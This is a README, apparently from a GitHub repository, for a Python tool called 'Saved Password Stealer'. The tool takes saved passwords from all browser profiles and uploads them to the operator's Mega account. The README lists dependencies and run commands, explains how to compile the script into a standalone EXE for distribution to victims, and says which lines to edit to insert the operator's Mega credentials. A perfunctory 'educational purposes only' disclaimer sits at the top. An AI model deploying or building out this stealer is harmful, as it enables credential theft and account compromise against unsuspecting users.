# Saved Password Stealer

Steal All Profile Saved Password On Browser And Upload To Your Mega Account

## Disclamer

This tool is for educational purposes only; Any actions and or activities related to this tool are solely your responsibility. The used of this tool can result in criminal charges brought against the persons in question. I'll not be held responsible in the event any criminal charges be brought against any individuals misusing this tool to break the law.

## Module Used

```python
mega.py==1.0.8
pycryptodome==3.15.0
pypiwin32==223
```
## Usage

### Install All Module

```python
  pip install -r requirements.txt
```
### Run Tool

```python
  python stealer.py
```

### Convert To EXE

```python
  # Using Pyinstaller
  Pyinstaller --noconfirm --onefile stealer.py

  # recommend Using Nuitka
  py -m nuitka --mingw64 .\stealer.py --standalone --onefile 
 ```


### Change Account

Change line 200 and 201 to your own mega account

<img src="https://github.com/katakkentut/SavedPasswordStealerPython/blob/master/screenshot/Screenshot%202022-09-11%20234424.png">

 
 
